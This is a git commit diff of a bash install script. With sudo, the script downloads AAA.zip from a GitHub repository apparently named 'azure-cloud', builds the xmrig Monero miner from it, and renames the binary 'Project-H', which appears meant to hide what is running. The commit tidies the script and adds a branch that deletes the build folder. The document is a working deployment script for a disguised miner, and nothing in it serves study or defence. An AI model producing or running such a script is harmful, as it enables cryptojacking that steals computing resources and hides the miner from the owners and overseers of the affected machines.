88ffd918627e16d106c573bad728d22f4ea7392d
U117A <33190250+U117A@users.noreply.github.com>
2020-08-22 12:48:44 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,20 +1,16 @@
 #!/bin/bash
-
 if [ ! -e "AAA" ]; then
-
 	sudo apt-get update
 	sudo apt-get --assume-yes install build-essential cmake libuv1-dev libssl-dev libhwloc-dev git unzip
 	sudo wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip
 	sudo unzip AAA.zip
-	#sudo rm -rf "$HOME"/AAA #IF****
-	#sudo mv AAA "$HOME"
 	sudo rm -rf AAA.zip
-
 	cd AAA
 	mkdir build
 	cd build
 	cmake ..
 	make
 	sudo mv xmrig Project-H
-
+else
+	sudo rm -rf AAA
 fi
